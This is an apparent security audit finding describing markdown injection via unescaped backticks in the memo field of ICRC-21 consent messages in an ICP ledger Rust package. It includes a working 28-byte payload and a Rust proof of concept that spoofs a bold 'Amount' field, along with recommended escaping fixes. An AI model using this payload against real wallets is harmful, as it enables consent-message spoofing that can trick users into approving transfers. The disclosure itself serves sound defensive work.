### Title
Unsanitized Memo Injection into `GenericDisplayMessage` Markdown via `add_memo` — (`packages/icrc-ledger-types/src/icrc21/responses.rs`)

---

### Summary

The `add_memo` function embeds raw memo bytes (when valid UTF-8) verbatim into a backtick-delimited inline code span inside a markdown-formatted `GenericDisplayMessage`. Because backtick characters in the memo are not escaped, an attacker can close the opening backtick early and inject arbitrary markdown outside the code span — including fake bold fields like `**Amount:**` or `**To:**` — into the consent message returned by the public `icrc21_canister_call_consent_message` endpoint.

---

### Finding Description

In `packages/icrc-ledger-types/src/icrc21/responses.rs`, the `add_memo` method appends the memo to the `GenericDisplayMessage` as:

```rust
message.push_str(&format!("\n\n**Memo:**\n`{memo_str}`"));
``` [1](#0-0) 

`memo_str` is the raw UTF-8 string decoded from the caller-supplied memo bytes with no sanitization:

```rust
let memo_str = match std::str::from_utf8(memo.as_slice()) {
    Ok(valid_str) => valid_str.to_string(),
    Err(_) => hex::encode(memo.as_slice()),
};
``` [2](#0-1) 

The `icrc21_canister_call_consent_message` endpoint is a public `#[update]` with no access control on both the ICP ledger and the ICRC-1 ledger: [3](#0-2) [4](#0-3) 

Any caller can submit a `ConsentMessageRequest` with `method="icrc1_transfer"`, `device_spec=GenericDisplay`, and a `TransferArg` whose memo field contains a crafted UTF-8 payload. The memo is extracted and passed unsanitized through `build_icrc21_consent_info` → `ConsentMessageBuilder::build` → `add_memo`: [5](#0-4) 

---

### Impact Explanation

**CommonMark backtick injection.** The format string wraps the memo in a single-backtick code span. In CommonMark, a single backtick closes the span at the next single backtick. A memo such as (28 bytes, valid UTF-8):

```
foo`\n\n**Amount:** 9999999\n\n`
```

produces the following appended string:

```
\n\n**Memo:**\n`foo`\n\n**Amount:** 9999999\n\n``
```

CommonMark parsing:
- `` ` `` opens a code span; the `` ` `` after `foo` closes it → `foo` is rendered as inline code.
- `\n\n**Amount:** 9999999\n\n` is now **outside** any code span and renders as a bold heading `**Amount:** 9999999`.
- The trailing ` `` ` has no matching closer and is treated as literal characters.

A wallet UI rendering the `GenericDisplayMessage` as markdown (the intended use of the field per ICRC-21) would display a second, attacker-controlled `**Amount:**` field visually indistinguishable from the real one generated by the ledger. The same technique applies to `**To:**`, `**Fees:**`, or any other field label.

The `FieldsDisplayMessage` variant is **not** affected — it stores the memo as a structured `Value::Text` field: [6](#0-5) 

---

### Likelihood Explanation

- The endpoint is public and requires no privilege.
- The default max memo length is 32 bytes; the minimal injection payload is 28 bytes, well within the limit. [7](#0-6) 

- Any dApp can present a transaction with a crafted memo to a user; the wallet calls `icrc21_canister_call_consent_message` with those exact args and renders the result.
- Wallets that render `GenericDisplayMessage` as markdown (the standard's intent) are directly affected.

---

### Recommendation

Sanitize `memo_str` before embedding it in the markdown template. The minimal fix is to escape all backtick characters (`` ` ``) in `memo_str` before interpolation, or to use a double/triple backtick fence whose length is guaranteed to exceed any run of backticks in the memo:

```rust
// Option A: escape backticks
let safe = memo_str.replace('`', "\\`");
message.push_str(&format!("\n\n**Memo:**\n`{safe}`"));

// Option B: use a fence length that cannot appear in the memo
let fence = "`".repeat(memo_str.chars().filter(|&c| c == '`').count() + 3);
message.push_str(&format!("\n\n**Memo:**\n{fence}{memo_str}{fence}"));
```

Additionally, strip or escape newline characters (`\n`, `\r`) and other control characters from `memo_str` to prevent multi-line injection even without backtick escaping. [1](#0-0)

### Proof of Concept

```rust
// Craft a 28-byte UTF-8 memo that injects a fake Amount field
let malicious_memo: Vec<u8> = b"foo`\n\n**Amount:** 9999999\n\n`".to_vec();
// 28 bytes, valid UTF-8, within the default 32-byte limit

let transfer_args = TransferArg {
    from_subaccount: None,
    to: victim_account,
    fee: None,
    amount: Nat::from(1_u32),          // real amount: 0.00000001 ICP
    created_at_time: None,
    memo: Some(Memo::from(malicious_memo)),
};

let request = ConsentMessageRequest {
    method: "icrc1_transfer".to_string(),
    arg: Encode!(&transfer_args).unwrap(),
    user_preferences: ConsentMessageSpec {
        metadata: ConsentMessageMetadata { language: "en".to_string(), utc_offset_minutes: None },
        device_spec: Some(DisplayMessageType::GenericDisplay),
    },
};

// Call icrc21_canister_call_consent_message (public endpoint, no auth)
// The returned GenericDisplayMessage will contain:
//   **Memo:** `foo`
//
//   **Amount:** 9999999
//
//   ``
//
// A markdown-rendering wallet displays a bold "Amount: 9999999" field
// visually identical to the real amount field above it.
```

The rendered output contains two `**Amount:**` entries: the real one (0.00000001 ICP) and the injected one (9999999), enabling consent-message spoofing.
